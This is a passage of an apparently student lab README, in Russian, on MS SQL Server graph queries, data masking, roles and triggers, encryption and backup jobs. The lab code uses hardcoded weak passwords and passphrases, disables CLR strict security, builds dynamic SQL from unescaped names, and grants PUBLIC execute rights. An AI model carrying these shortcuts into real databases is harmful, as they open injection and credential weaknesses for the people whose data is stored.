     [dbo].[PaintVolumeInfoEdgeGraphTable] B1,
     [dbo].[PaintBallonNodesGraphTable] V,
	 [dbo].[SquaresNodesGraphTable] Q2,
     [dbo].[PaintVolumeInfoEdgeGraphTable] B2
WHERE MATCH (Q1-(B1)->V)
AND MATCH (Q2-(B2)->V)
AND Q1.$node_id <> Q2.$node_id
```

| V\_NAME |
| :--- |
| Balloon # 10 |
| Balloon # 17 |
| Balloon # 25 |
| Balloon # 26 |
| Balloon # 31 |
| Balloon # 32 |
| Balloon # 33 |
| Balloon # 34 |
| Balloon # 35 |
| Balloon # 36 |
| Balloon # 39 |
| Balloon # 42 |
| Balloon # 44 |
| Balloon # 45 |
| Balloon # 46 |
| Balloon # 50 |


#### Часть A. Задание 2

```tsql
--5. Кастомный запрос
-- Найти квадраты, которые красили до начала 2003 года
SELECT DISTINCT Q.[Q_NAME]
FROM [dbo].[SquaresNodesGraphTable] Q,
     [dbo].[PaintVolumeInfoEdgeGraphTable] B,
     [dbo].[PaintBallonNodesGraphTable] V
WHERE MATCH (Q-(B)->V)
AND B.[B_DATETIME] < '2003-01-01';
```

| Q\_NAME |
| :--- |
| Square # 22 |

# <img src="https://github.com/user-attachments/assets/e080adec-6af7-4bd2-b232-d43cb37024ac" width="20" height="20"/> Lab5
<h3 align="center">
  <a href="#client"></a>
  Маскирование данных
</h3>

#### Часть A. 

```tsql
-- Создание тестовой таблицы
CREATE TABLE [dbo].OriginalTable(
    Id INT PRIMARY KEY,
    Name NVARCHAR(100),
    Email NVARCHAR(100)
);

-- Вставка тестовых данных
INSERT INTO [dbo].OriginalTable (Id, Name, Email)
VALUES
(1, 'John Doe', 'john.doe@example.com'),
(2, 'Jane Smith', 'jane.smith@example.com');

-- Создание вспомогательной таблицы для отслеживания статусов маскировки
CREATE TABLE MaskingSettings (
    FieldName VARCHAR(75) PRIMARY KEY,
    MaskingEnabled BIT DEFAULT 0
);

-- Инициализация начальных данных о маскировке
INSERT INTO MaskingSettings (FieldName, MaskingEnabled)
VALUES
('Name', 0),
('Email', 0);
```

```tsql
-- Функция маскирования
-- Принимает символьное значение и возвращает замаскированную строку(замена всех символов звездочками (*).
-- *Если входное значение NULL, функция также вернет NULL.
CREATE OR ALTER FUNCTION [dbo].MaskData(@input NVARCHAR(MAX))
RETURNS NVARCHAR(MAX)
AS
BEGIN
    RETURN CASE
        WHEN @input IS NULL THEN NULL
        ELSE REPLICATE('*', LEN(@input))
    END
END
GO

-- Представление для работы с замаскированными данными вместо оригинальных.
CREATE VIEW dbo.MaskedView
AS
SELECT
    Id,
    [dbo].MaskData(Name) AS Name,
    [dbo].MaskData(Email) AS Email
FROM [dbo].OriginalTable
GO

-- Функция для включения/отключения маскирования для указанных полей
CREATE OR ALTER PROCEDURE dbo.ToggleMasking
    @FieldNames NVARCHAR(MAX),
    @EnableMasking BIT
AS
BEGIN
    DECLARE @SQL NVARCHAR(MAX);
    DECLARE @FieldList NVARCHAR(MAX) = '';
    DECLARE @TableName NVARCHAR(MAX) = 'OriginalTable';

    -- Создание временной таблицы для хранения имен полей
    DECLARE @Fields TABLE (FieldName NVARCHAR(100));

    -- Заполнение временной таблицы списком полей
    INSERT INTO @Fields (FieldName)
    SELECT TRIM(value)
    FROM STRING_SPLIT(@FieldNames, ',');

    -- Обновление статусов маскировки в таблице MaskingSettings
    UPDATE MaskingSettings
    SET MaskingEnabled = @EnableMasking
    WHERE FieldName IN (SELECT FieldName FROM @Fields);

    -- Получение списка всех полей из таблицы dbo.OriginalTable
    SELECT @FieldList = STRING_AGG(
        CASE
            WHEN ms.MaskingEnabled = 1 THEN 'dbo.MaskData(' + c.COLUMN_NAME + ') AS ' + c.COLUMN_NAME
            ELSE c.COLUMN_NAME
        END, ', ')
    FROM INFORMATION_SCHEMA.COLUMNS c
    LEFT JOIN MaskingSettings ms ON c.COLUMN_NAME = ms.FieldName
    WHERE c.TABLE_NAME = @TableName;

    -- Создание представления с динамически построенным списком полей
    SET @SQL = 'CREATE OR ALTER VIEW dbo.MaskedView AS SELECT ' + @FieldList + ' FROM ' + @TableName;

    -- Выполнение динамического SQL-запроса
    EXEC sp_executesql @SQL;
END
GO
```

```tsql
-- Вывод изначальных данных из представления с маскированием
SELECT * FROM dbo.MaskedView;
```

| Id | Name | Email |
| :--- | :--- | :--- |
| 1 | John Doe | john.doe@example.com |
| 2 | Jane Smith | jane.smith@example.com |


```tsql
-- Включение маскирования для поля Name
EXEC dbo.ToggleMasking @FieldNames = 'Name', @EnableMasking = 1;
-- Проверка данных после включения маскирования
SELECT * FROM dbo.MaskedView;
```

| Id | Name | Email |
| :--- | :--- | :--- |
| 1 | \*\*\*\*\*\*\*\* | john.doe@example.com |
| 2 | \*\*\*\*\*\*\*\*\*\* | jane.smith@example.com |


```tsql
-- Включение маскирования для поля Email
EXEC dbo.ToggleMasking @FieldNames = 'Email', @EnableMasking = 1;
-- Проверка данных после включения маскирования
SELECT * FROM dbo.MaskedView;
```

| Id | Name | Email |
| :--- | :--- | :--- |
| 1 | \*\*\*\*\*\*\*\* | \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* |
| 2 | \*\*\*\*\*\*\*\*\*\* | \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* |


```tsql
-- Отключение маскирования для поля Email
EXEC dbo.ToggleMasking @FieldNames = 'Email', @EnableMasking = 0;
-- Проверка данных после отключения маскирования
SELECT * FROM dbo.MaskedView;
```

| Id | Name | Email |
| :--- | :--- | :--- |
| 1 | \*\*\*\*\*\*\*\* | john.doe@example.com |
| 2 | \*\*\*\*\*\*\*\*\*\* | jane.smith@example.com |


```tsql
-- Включение маскирования для полей Name и Email одной командой
EXEC dbo.ToggleMasking @FieldNames = 'Name,Email', @EnableMasking = 1;
-- Проверка данных после включения маскирования
SELECT * FROM dbo.MaskedView;
```

| Id | Name | Email |
| :--- | :--- | :--- |
| 1 | \*\*\*\*\*\*\*\* | \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* |
| 2 | \*\*\*\*\*\*\*\*\*\* | \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* |


```tsql
-- Отключение маскирования для полей Name и Email одной командой
EXEC dbo.ToggleMasking @FieldNames = 'Name,Email', @EnableMasking = 0;
-- Проверка данных после отключения маскирования
SELECT * FROM dbo.MaskedView;
```

| Id | Name | Email |
| :--- | :--- | :--- |
| 1 | John Doe | john.doe@example.com |
| 2 | Jane Smith | jane.smith@example.com |

# <img src="https://github.com/user-attachments/assets/e080adec-6af7-4bd2-b232-d43cb37024ac" width="20" height="20"/> Lab6
<h3 align="center">
  <a href="#client"></a>
  Задание 1.
</h3>

```tsql
USE Lab6;

-- Создание роли DevUserRole, присвоение к db_datareader и db_datawriter
CREATE ROLE DevUserRole
ALTER ROLE db_datareader ADD MEMBER DevUserRole
ALTER ROLE db_datawriter ADD MEMBER DevUserRole

-- Создание пользователя для роли DevUserRole
CREATE USER DevUser WITHOUT LOGIN WITH DEFAULT_SCHEMA=[dbo]
ALTER ROLE DevUserRole ADD MEMBER DevUser

-- TEST: создание тестовой процедуры
CREATE OR ALTER PROCEDURE MyProcedure1
AS
BEGIN
    SELECT 1
END
```

```tsql
-- TEST: попытка взаимодействия с процедурой
EXECUTE AS USER = 'DevUser'
EXEC MyProcedure1
REVERT
```

![1](https://github.com/user-attachments/assets/1c3f4bbb-0b35-4efb-9b08-296c2caf643d)

```tsql
-- Скрипт для выдачи прав на все существующие хранимые процедуры
DECLARE @sql_query NVARCHAR(MAX)
SET @sql_query = (
    SELECT STRING_AGG(
        'GRANT EXECUTE ON ' +
        QUOTENAME(SCHEMA_NAME(schema_id)) + '.' + QUOTENAME(name) +
        ' TO DevUserRole', CHAR(13)
    )
    FROM sys.objects
    WHERE type = 'P'
)
EXEC sp_executesql @sql_query
```

```tsql
-- TEST: попытка взаимодействия с процедурой
EXECUTE AS USER = 'DevUser'
EXEC MyProcedure1
REVERT
```

![2](https://github.com/user-attachments/assets/20677b58-9219-4818-9aa4-7d7dd88bc37a)

```tsql
-- Триггер для автоматической выдачи прав на выполнение всех вновь создаваемых в схеме dbo процедур для роли DevUserRole
CREATE OR ALTER TRIGGER AutoGrantExecuteOnCreateProcedure
ON DATABASE FOR CREATE_PROCEDURE
AS
BEGIN
    DECLARE @schema_name NVARCHAR(128)
    DECLARE @procedure_name NVARCHAR(128)
    DECLARE @sql_query NVARCHAR(MAX)
    SET @schema_name = EVENTDATA().value('(/EVENT_INSTANCE/SchemaName)[1]', 'NVARCHAR(128)')
    SET @procedure_name = EVENTDATA().value('(/EVENT_INSTANCE/ObjectName)[1]', 'NVARCHAR(128)')

    IF @schema_name = 'dbo'
    BEGIN
        SET @sql_query = 'GRANT EXECUTE ON ' +
                         QUOTENAME(@schema_name) + '.' + QUOTENAME(@procedure_name) +
                         ' TO DevUserRole'
        EXEC sp_executesql @sql_query
    END
END
```

```tsql
-- Создание новой процедуры
CREATE PROCEDURE MyProcedure2
AS
BEGIN
    SELECT 2
END

-- TEST: попытка взаимодействия с процедурой
EXECUTE AS USER = 'DevUser'
EXEC MyProcedure2
REVERT
```

![3](https://github.com/user-attachments/assets/f4e18c39-0014-4a72-bcda-9a549e1a3ac4)


<h3 align="center">
  <a href="#client"></a>
  Задание 2.
</h3>

```tsql
USE master;

-- Создание логина для авторизации
CREATE LOGIN TestAdmin WITH PASSWORD = N'root';

-- Создание таблицы с логами авторизаций
CREATE TABLE [LogAuditTestAdmin] (
    [LogID] INT IDENTITY(1,1) PRIMARY KEY,
    [IPAddress] NVARCHAR(30),
    [DateTime] DATETIME NOT NULL DEFAULT GETDATE(),
    [Status] NVARCHAR(50),
    [LoginName] NVARCHAR(50)
)

-- Выдача нужных прав
GRANT INSERT ON [master].[dbo].[LogAuditTestAdmin] TO public
GRANT CONNECT TO public

-- Создание триггера для ограничения авторизации и логгирования
CREATE OR ALTER TRIGGER AuditTestAdminTrigger
ON ALL SERVER FOR LOGON
AS
DECLARE @login_name NVARCHAR(50) = ORIGINAL_LOGIN();
IF @login_name = N'TestAdmin'
BEGIN
    DECLARE @current_time TIME = CONVERT(TIME, GETDATE());
    DECLARE @allowed_start_time TIME = '19:45:00';
    DECLARE @allowed_end_time TIME = '23:20:00';
    DECLARE @ip_address NVARCHAR(30) = EVENTDATA().value('(/EVENT_INSTANCE/ClientHost)[1]', 'NVARCHAR(30)');

    IF (@current_time BETWEEN @allowed_start_time AND @allowed_end_time) AND @ip_address = N'<local machine>'
    BEGIN
        INSERT INTO [LogAuditTestAdmin] ([IPAddress], [DateTime], [Status], [LoginName])
        VALUES (@ip_address, GETDATE(), N'Success', @login_name);
    END
    ELSE
    BEGIN
        ROLLBACK
        INSERT INTO [LogAuditTestAdmin] ([IPAddress], [DateTime], [Status], [LoginName])
        VALUES (@ip_address, GETDATE(), N'Fail', @login_name);
    END
END
```

![4](https://github.com/user-attachments/assets/368c019d-d54f-4771-8a1c-6c6dc5a44924)


<h3 align="center">
  <a href="#client"></a>
  Задание 3.
</h3>

```cs
// Код .dll сборки
using Microsoft.SqlServer.Server;
using System.Data.SqlClient;
using System.Xml;

public class Main
{
    public static void CLR_Trigger()
    {
        string event_data_serialized = SqlContext.TriggerContext.EventData.Value;
        XmlDocument event_data = new XmlDocument();
        event_data.LoadXml(event_data_serialized);
        XmlNode object_node = event_data.SelectSingleNode("/EVENT_INSTANCE/ObjectName");
        string table_name = object_node.InnerText;
        using (var sql_connect = new SqlConnection("context connection=true"))
        {
            sql_connect.Open();
            var trigger = new SqlCommand(
                $"CREATE OR ALTER TRIGGER TriggerFor{table_name} " +
                $"ON {table_name} " +
                $"AFTER INSERT " +
                $"AS " +
                $"BEGIN " +
                $"PRINT 'Trigger executed by table: {table_name}'; " +
                $"END;", sql_connect
            );
            trigger.ExecuteNonQuery();
        }
    }
}


```

```tsql
-- Вкл. поддержки CLR
EXEC sp_configure 'clr enabled', 1
-- Вкл. расширенных параметров конфигурации
EXEC sp_configure 'show advanced options', 1
-- Выкл. строгой безопасности для CLR сборок
EXEC sp_configure 'clr strict security', 0
RECONFIGURE

-- Создание CLR сборки из .dll файла
CREATE ASSEMBLY [CLR] FROM 'C:\\CLR\Trigger.dll' WITH PERMISSION_SET=SAFE

-- Создание триггера на основе CLR сборки
CREATE TRIGGER MyTrigger
ON DATABASE
FOR CREATE_TABLE
AS EXTERNAL NAME [CLR].Main.[CLR_Trigger]

-- Создание тестовой таблицы
CREATE TABLE MyTable
(
	[ID] INT IDENTITY(1,1) PRIMARY KEY,
	[myName] NVARCHAR(128) NULL
)

-- Вставка тестового элемента
INSERT INTO MyTable([myName])
VALUES('Stepan')
```

![5](https://github.com/user-attachments/assets/056e8804-6a43-4540-a6d8-f2afe4032dd5)

# <img src="https://github.com/user-attachments/assets/e080adec-6af7-4bd2-b232-d43cb37024ac" width="20" height="20"/> Lab7
<h3 align="center">
  <a href="#client"></a>
  Шифрование
</h3>

```tsql
-- Инициализация ролей и пользователей для них
CREATE ROLE Operator;
CREATE ROLE Registrar;
CREATE ROLE Chief;
GO

-- Создаем пользователя для роли Operator
CREATE LOGIN TestOperator WITH PASSWORD = 'StrongTestPassword';
GO
USE PersonalDataDB;
GO
CREATE USER TestOperator FOR LOGIN TestOperator;
GO
-- Назначаем роль Operator
EXEC sp_addrolemember 'Operator', 'TestOperator';
GO

-- Создание пользователя для роли Chief
CREATE LOGIN TestChief WITH PASSWORD = 'StrongChiefPassword';
GO
USE PersonalDataDB;
GO
CREATE USER TestChief FOR LOGIN TestChief;
GO

-- Назначаем роль Chief
EXEC sp_addrolemember 'Chief', 'TestChief';
GO
```

Часть 1. TDE (Transparrent Data Encryption)
```tsql
-- Создание главного ключа и сертификата
USE master;
GO
CREATE MASTER KEY ENCRYPTION BY PASSWORD = 'strong';
GO
CREATE CERTIFICATE MyServerCertificate WITH SUBJECT = 'MyDatabaseEncryptionKeyCertificate';
GO
-- Включение TDE
USE PersonalDataDB;
GO
CREATE DATABASE ENCRYPTION KEY
WITH ALGORITHM = AES_256
ENCRYPTION BY SERVER CERTIFICATE MyServerCertificate;
GO
ALTER DATABASE PersonalDataDB
SET ENCRYPTION ON;
GO
```

```tsql
-- Проверка состояния шифрования
SELECT d.name AS database_name, k.*
FROM sys.dm_database_encryption_keys k
JOIN sys.databases d ON k.database_id = d.database_id;
-- encryption_state == 3 -> база данных зашифрована и активна
```

| database\_name | database\_id | encryption\_state | create\_date | regenerate\_date | modify\_date | set\_date | opened\_date | key\_algorithm | key\_length | encryptor\_thumbprint | encryptor\_type | percent\_complete | encryption\_state\_desc | encryption\_scan\_state | encryption\_scan\_state\_desc | encryption\_scan\_modify\_date |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| tempdb | 2 | 3 | 2024-12-07 09:32:57.833 | 2024-12-07 09:32:57.833 | 2024-12-07 09:32:57.833 | 1900-01-01 00:00:00.000 | 2024-12-07 09:32:57.833 | AES | 256 | com.intellij.database.extractors.TextInfo@95cc24cf | ASYMMETRIC KEY | 0 | ENCRYPTED | 4 | COMPLETE | 2024-12-07 09:32:57.833 |
| PersonalDataDB | 12 | 3 | 2024-12-07 09:32:57.817 | 2024-12-07 09:32:57.817 | 2024-12-07 09:32:57.817 | 2024-12-07 09:32:57.830 | 2024-12-07 09:32:57.817 | AES | 256 | 0xFD15294AA3A25982E3106407F5B196B24CBB7F2F | CERTIFICATE | 0 | ENCRYPTED | 4 | COMPLETE | 2024-12-07 09:32:57.893 |


```tsql
SELECT name, is_encrypted
FROM sys.databases
WHERE name = 'PersonalDataDB';
```

| name | is\_encrypted |
| :--- | :--- |
| PersonalDataDB | true |


Часть 2. CLE (Column-Level Encryption)

А) С использованием парольной фразы
```tsql
-- Добавление столбца EncryptedCity
ALTER TABLE Addresses ADD EncryptedCity VARBINARY(MAX);
GO

-- Создание процедуры для шифрования
CREATE OR ALTER PROCEDURE EncryptCity
AS
BEGIN
    DECLARE @Passphrase NVARCHAR(128) = 'stepan1';
    UPDATE Addresses
    SET EncryptedCity = ENCRYPTBYPASSPHRASE(@Passphrase, City)
END;
GO

-- Выполнение процедуры шифрования
EXEC EncryptCity;
GO
```

```tsql
-- Создание процедуры для дешифрования данных поля EncryptCity
CREATE OR ALTER PROCEDURE DecryptCity
AS
BEGIN
    DECLARE @Passphrase NVARCHAR(128) = 'stepan1';
    IF IS_ROLEMEMBER('Operator') = 1
    BEGIN
        -- Дешифрование для пользователей с ролью Operator
        SELECT AddressID, PersonID, Street, State, ZipCode,
               CONVERT(NVARCHAR(MAX), DECRYPTBYPASSPHRASE(@Passphrase, EncryptedCity)) AS [City(*decrypted)]
        FROM Addresses;
    END
    ELSE
    BEGIN
        -- Отображение зашифрованных данных для всех остальных пользователей
        SELECT AddressID, PersonID, Street, State, ZipCode, EncryptedCity
        FROM Addresses;
    END
END;
GO

-- Установка прав доступа к процедуре
GRANT EXECUTE ON DecryptCity TO PUBLIC;
GO
```

Тестирование DecryptCity
![6](https://github.com/user-attachments/assets/3c9013a1-5423-449b-ac9b-1af7e19cfbf7)


B) С использованием ассиметричного ключа
```tsql
-- Добавление колонки EncryptedFirstName в таблицу Persons
ALTER TABLE Persons ADD EncryptedFirstName VARBINARY(MAX);
GO

-- Создание асимметричного ключа
USE PersonalDataDB;
GO
CREATE MASTER KEY ENCRYPTION BY PASSWORD = 'StrongMasterKeyPassword';
GO
CREATE ASYMMETRIC KEY MyAsymKey
WITH ALGORITHM = RSA_2048;
GO

-- Выдача прав на контроль ассиметричного ключа для роли
GRANT CONTROL ON ASYMMETRIC KEY::MyAsymKey TO Chief;
GO

-- Проверка существования ассиметричного ключа
SELECT * FROM sys.asymmetric_keys;
```

| name | principal\_id | asymmetric\_key\_id | pvt\_key\_encryption\_type | pvt\_key\_encryption\_type\_desc | thumbprint | algorithm | algorithm\_desc | key\_length | sid | string\_sid | public\_key | attested\_by | provider\_type | cryptographic\_provider\_guid | cryptographic\_provider\_algid |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| MyAsymKey | 1 | 260 | MK | ENCRYPTED\_BY\_MASTER\_KEY | 0xFE0E0BFE5D170B6B | 3R | RSA\_2048 | 2048 | 0x010300000000000902000000FE0E0BFE5D170B6B | S-1-9-2-4262137598-1795888989 | 0x0602000000240000525341310008000001000100CD9C05958DC2B32412AC553F7A3008A0BCB2ECE50EA1EABF36A8CE300E74A14B44DF8AC008BB7CCD6206578DA78FC867EC843F22DAB741EBF2E38E9460614F491BB1D9C54BE209D875A95D675E058086B6BAD2954750EB83DBD58FDF14CA751511D4EF15CA5AE14EA3F8EFDC91BA473D0578528E2B0788A42E1509A243ED922500CC59DB6DD08E7F481354281BA11C7176FDDBA45247556C4D56E2F79DE2ECC65F8A062F7A14A0B46806D662D63073076C16E7C25C715CE1DF6E09ABAC006CBDEF2BD2907B4A71BB9C4A13C7C2932EE74CE5A90FEA8A8627A1930E1131D92A237A4F4695CA0A91D561E12FBB3886D71DC4C54B1CA43240A819A0757F087B05BD | null | null | null | null |

```tsql
-- Создание процедуры для шифрования
CREATE OR ALTER PROCEDURE EncryptFirstName
AS
BEGIN
    UPDATE Persons
    SET EncryptedFirstName = ENCRYPTBYASYMKEY(ASYMKEY_ID('MyAsymKey'), FirstName);
END;
GO
-- Выполнение процедуры шифрования
EXEC EncryptFirstName;
GO

-- Создание процедуры для дешифрования данных
CREATE OR ALTER PROCEDURE DecryptFirstName
AS
BEGIN
    -- Проверка роли пользователя
    IF IS_ROLEMEMBER('Chief') = 1
    BEGIN
        SELECT PersonID,
               CONVERT(NVARCHAR(128), DECRYPTBYASYMKEY(ASYMKEY_ID('MyAsymKey'), EncryptedFirstName)) AS [FirstName(*decrypted)],
               LastName,
               DateOfBirth,
               Email
        FROM Persons;
    END
    ELSE
    BEGIN
        SELECT PersonID, EncryptedFirstName, LastName, DateOfBirth, Email
        FROM Persons;
    END
END;
GO
-- Установка прав доступа
GRANT EXECUTE ON DecryptFirstName TO PUBLIC;
GO
```

Тестирование DecryptFirstName
![7](https://github.com/user-attachments/assets/ce5543a5-2c80-4f69-82b5-84a9e09ede9a)

С) С использованием сертификата
```tsql
CREATE CERTIFICATE MyCertificate WITH SUBJECT = 'Encrypt LastName';
GO

-- Выдача прав на контроль сертификата для роли
GRANT CONTROL ON CERTIFICATE::MyCertificate TO Operator;
GO

-- Добавление колонки EncryptedLastName в таблицу Persons
ALTER TABLE Persons ADD EncryptedLastName VARBINARY(MAX);
GO

-- Создание процедуры для шифрования
CREATE OR ALTER PROCEDURE EncryptLastName
AS
BEGIN
    UPDATE Persons
    SET EncryptedLastName = ENCRYPTBYCERT(CERT_ID('MyCertificate'), LastName);
END;
GO
-- Выполнение процедуры шифрования
EXEC EncryptLastName;
GO

-- Создание процедуры для дешифрования данных
CREATE OR ALTER PROCEDURE DecryptLastName
AS
BEGIN
    -- Проверка роли пользователя
    IF IS_ROLEMEMBER('Operator') = 1
    BEGIN
        SELECT PersonID,
               FirstName,
               CONVERT(NVARCHAR(MAX), DECRYPTBYCERT(CERT_ID('MyCertificate'), EncryptedLastName)) AS [LastName(decrypted)],
               DateOfBirth,
               Email
        FROM Persons;
    END
    ELSE
    BEGIN
        SELECT PersonID, FirstName, EncryptedLastName, DateOfBirth, Email
        FROM Persons;
    END
END;
GO
-- Установка прав доступа
GRANT EXECUTE ON DecryptLastName TO PUBLIC;
GO
```

Тестирование DecryptLastName
![8](https://github.com/user-attachments/assets/393c3d59-529b-46fc-adf7-021c09a8d3b4)

Часть 3. Always Encrypted

A) Шифрование столбца
![9(шифрование столбца)](https://github.com/user-attachments/assets/529b6735-ed6f-4161-9e54-502ab53edfb6)

```tsql
SELECT [DateOfBirth] FROM Persons
```

| DateOfBirth |
| :--- |
| 0x014F1C8D2825BB131CB2893DB652D252ED2188D841E05D36385780D8FEA9E498F084D419222CFE5C852E87BE100C45AE726EE5DE20E0A8ECA25A45B711F25F2132 |
| 0x0113F2CABFB695C8040911467319C03302E43AFAB505ABF0DC535B1D3554477DB90D24123E4F37A658CA2D9E4D81A0B5691766330A7E916E66E1E855ED2F235E10 |
| 0x01AC373D2B4797D44BEEAB12FC9C99624E2B91980398100923C7A4106EBE39F3900C45FC54BD1AFE09A07C5AE42A765BAC527C31FE9079CE058727F23828880C2A |
| 0x01A8197BA1DB168F052ED509B9EC0BED425372261324350F92A955856FC197AD99CCBED7419BCEBC6AAC279C67EF98FF27FFA0C939C4DE01B1501347C1D70221FB |
| 0x011FECDB13A67413665AED6DD9CD5900AFAB9E16A11ACACC66E2A0C125EBFCA1715BDA9C3331E241484B21EB06E62E786049145F1D7B3DC9385D7388E45E25CAF9 |
| 0x01523A032BD5607D610B62C902F26F0783D06EDD6108A4816AF74B0BE1349F5A1FB76C7F2FEBFB2546BECC898B2C43F49B7A1737EB93FAB30FB122B20107F34228 |
| 0x01D582B10B172575D0F7D384DF0C42AD898709EA51E9BC696ABE3FAC39CEB73B74DC72E6B329043B7613DB74985DBA9F98A26E2DB4B1132A64A3431D7EBA1FCA70 |
| 0x0107E252C4863AC4FFCC6B675DC123A65C4B3B17212840CA4DF57EC92025D7A0C590A3A9024CE7EBB26F3E14498D169552FF623DCAC684876370E964B8EDF1FA03 |
| 0x01FBD16253699840DAF88169E228246C99EFDC090A6609E006FC56E124E9DC25CB6B544D32047342BD076CA2DFF6D49B5DC75997E860D0343536F923AEB3843554 |
| 0x0179DEC841291C8BA77A50569878320CF931CB260E0F676D533FF1305382FA1209E3B1F08F9847BA2A834D995EE87AE6AA672617587B53125E9C627F51A893BA58 |

B) Подключение к БД с особым параметром для просмотра зашифрованной информации

![13](https://github.com/user-attachments/assets/f0ab7dc6-e2f8-423d-97bf-e003faf1d841)

С) Полная отмена шифрования столбца

![10(дешифрование столбца)](https://github.com/user-attachments/assets/a0831f54-07c6-4792-9927-f7898f3f940e)

```tsql
SELECT [DateOfBirth] FROM Persons
```

| DateOfBirth |
| :--- |
| 1985-05-15 |
| 1990-03-22 |
| 1988-07-30 |
| 1975-12-01 |
| 1995-02-14 |
| 1982-09-10 |
| 1993-11-25 |
| 1980-06-18 |
| 1978-04-05 |
| 1992-08-12 |

# <img src="https://github.com/user-attachments/assets/e080adec-6af7-4bd2-b232-d43cb37024ac" width="20" height="20"/> Lab8
<h3 align="center">
  <a href="#client"></a>
  Работа с бэкапами. *Все скрипты, сгенерированные MSSQL можно найти в репозиторий/Lab8
</h3>

Задание 1.

Шаг 1. T-SQL
```tsql
BACKUP DATABASE [TestDB]
TO DISK = 'C:\Backup(Task1)\SourceBak\TestDB.bak'
WITH NOINIT;
```

Шаг 2. cmd
```cmd
powershell.exe -ExecutionPolicy Bypass -File "C:\Backup(Task1)\CopyBackup.ps1"
```

Содержимое CopyBackup.ps1
```ps1
$source = "C:\Backup(Task1)\SourceBak\TestDB.bak"
$destination = "C:\Backup(Task1)\TargetBak\"
$logFile = "C:\Backup(Task1)\SourceBak\log.txt"

try {
    Copy-Item -Path $source -Destination $destination -ErrorAction Stop
    $logMessage = "Задание ""DB_Backup(task1)"": шаг 2, ""Копирование .bak"" '$source' в '$destination' завершено успешно."
} catch {
    $logMessage = "Задание ""DB_Backup(task1)"": шаг 2, ""Копирование .bak"" '$source' не удалось. $_"
}

Add-Content -Path $logFile -Value $logMessage
```

Настройки расписания:
![image](https://github.com/user-attachments/assets/cf8a6085-a2d1-47c4-acc2-d4c6efe8355c)

Файлы логов за несколько запусков:
```txt
Задание "DB_Backup(task1)": шаг 1, "DB Backup": началось выполнение 2024-12-15 00:29:42
Обработано 528 страниц для базы данных "TestDB", файл "TestDB" для файла 31. [SQLSTATE 01000]
Обработано 2 страниц для базы данных "TestDB", файл "TestDB_log" для файла 31. [SQLSTATE 01000]
BACKUP DATABASE успешно обработал 530 страниц за 0.021 секунд (196.986 MБ/сек). [SQLSTATE 01000]
Задание "DB_Backup(task1)": шаг 2, "Копирование .bak" 'C:\Backup(Task1)\SourceBak\TestDB.bak' в 'C:\Backup(Task1)\TargetBak\' завершено успешно.

Задание "DB_Backup(task1)": шаг 1, "DB Backup": началось выполнение 2024-12-15 00:29:53
Обработано 528 страниц для базы данных "TestDB", файл "TestDB" для файла 32. [SQLSTATE 01000]
Обработано 2 страниц для базы данных "TestDB", файл "TestDB_log" для файла 32. [SQLSTATE 01000]
BACKUP DATABASE успешно обработал 530 страниц за 0.023 секунд (179.857 MБ/сек). [SQLSTATE 01000]
Задание "DB_Backup(task1)": шаг 2, "Копирование .bak" 'C:\Backup(Task1)\SourceBak\TestDB.bak' в 'C:\Backup(Task1)\TargetBak\' завершено успешно.

Задание "DB_Backup(task1)": шаг 1, "DB Backup": началось выполнение 2024-12-15 00:31:21
Обработано 528 страниц для базы данных "TestDB", файл "TestDB" для файла 33. [SQLSTATE 01000]
Обработано 2 страниц для базы данных "TestDB", файл "TestDB_log" для файла 33. [SQLSTATE 01000]
BACKUP DATABASE успешно обработал 530 страниц за 0.023 секунд (179.857 MБ/сек). [SQLSTATE 01000]
Задание "DB_Backup(task1)": шаг 2, "Копирование .bak" 'C:\Backup(Task1)\SourceBak\TestDB.bak' в 'C:\Backup(Task1)\TargetBak\' завершено успешно.
```

Задание 2.

Шаг1. T-SQL
```tsql
BACKUP DATABASE [TestDB] 
TO DISK = 'C:\Backup(Task2)\SourceBak\TestDBdiff.bak' 
WITH DIFFERENTIAL;
```

Шаг2. cmd
```cmd
powershell.exe -ExecutionPolicy Bypass -File "C:\Backup(Task2)\CopyBackup.ps1"
```

Содержимое CopyBackup.ps1
```ps1
$source = "C:\Backup(Task2)\SourceBak\TestDBdiff.bak"
$destination = "C:\Backup(Task2)\TargetBak\"
$logFile = "C:\Backup(Task2)\SourceBak\log.txt"

try {
    Copy-Item -Path $source -Destination $destination -ErrorAction Stop
    $logMessage = "Задание ""DB_Diff_Backup(task2)"": шаг 2, ""Копирование .bak"" '$source' в '$destination' завершено успешно."
} catch {
    $logMessage = "Задание ""DB_Diff_Backup(task2)"": шаг 2, ""Копирование .bak"" '$source' не удалось. $_"
}

Add-Content -Path $logFile -Value $logMessage

```

Шаг3. T-SQL
```tsql
------------------ Part1: Восстановить последний полный бэкап
IF DB_ID(N'DiffBackupTestDB') IS NOT NULL
BEGIN
    ALTER DATABASE [DiffBackupTestDB]
    SET SINGLE_USER WITH ROLLBACK IMMEDIATE;
    DROP DATABASE [DiffBackupTestDB]
END;
GO

DECLARE @lastPosition INT
SELECT TOP 1 @lastPosition = [position]
FROM [msdb].[dbo].[backupset]
WHERE [database_name] = N'TestDB' AND [type] = 'D'
ORDER BY [backup_finish_date] DESC;

-- Восстанавливаем базу данных из актуального полного бэкапа
RESTORE DATABASE [DiffBackupTestDB]
FROM DISK = 'C:\Backup(Task1)\TargetBak\TestDB.bak'
WITH FILE = @lastPosition,
MOVE 'TestDB' TO 'C:\MS SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\DiffBackupTestDB.mdf',
MOVE 'TestDB_log' TO 'C:\MS SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\DiffBackupTestDB_log.ldf',
NORECOVERY
GO

------------------ Part2: Восстановить последний дифференциальный бэкап
DECLARE @lastPosition INT
SELECT TOP 1 @lastPosition = [position]
FROM [msdb].[dbo].[backupset]
WHERE [database_name] = N'TestDB' AND [type] = 'I'
ORDER BY [backup_finish_date] DESC;

RESTORE DATABASE [DiffBackupTestDB]
FROM DISK = 'C:\Backup(Task2)\TargetBak\TestDBdiff.bak'
WITH FILE = @lastPosition,
